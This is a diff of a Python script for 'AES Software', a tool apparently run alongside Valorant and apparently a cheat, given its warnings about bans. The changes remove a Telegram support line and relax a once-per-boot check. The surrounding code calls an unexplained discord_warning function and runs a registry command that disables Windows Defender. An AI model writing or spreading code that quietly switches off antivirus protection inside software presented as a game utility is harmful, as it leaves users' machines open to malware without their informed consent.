@@ -36,7 +36,6 @@ if is_valorant_running():
     printg("---ERROR. Please run AES first before you open Valorant.")
     printg("---This is for your own safety.")
     printg("---If error persists, restart PC.")
-    printg("CONTACT DEV IN TELEGRAM FOR SUPPORT: @ggbnnxfghbb")
     show_message_box("ERROR. Please run AES first before you open Valorant.", "Error", MB_OK | ICON_ERROR)
     exit()
 else:
@@ -51,9 +50,11 @@ else:
     discord_warning(msg4xsd)
     mylogo()
     printg("---Error,a current settings has been already loaded in this current session of boot.")
-    printg("---AES will not work until you restart PC.")
-    show_message_box("Error,You must restart PC for AES Software to work. You cannot run AES Anymore in this current session.", "Error", MB_OK | ICON_ERROR)
-    exit()
+    printg("---If you are sure that you haven't loaded AES in this boot session, then go click ok.")
+    printg("---If you have loaded AES software before in this boot session, then RESTART PC or you will be banned.")
+    printg("---For your safety, read the above message.")
+    show_message_box("System detected that you have loaded AES Software in this boot session.\nIf you haven't then click OK.\If you have, restart PC or you will be banned.\nYou can only load a settings once per boot.", "Error", MB_OK | ICON_ERROR)
+    
 
 try:
     subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
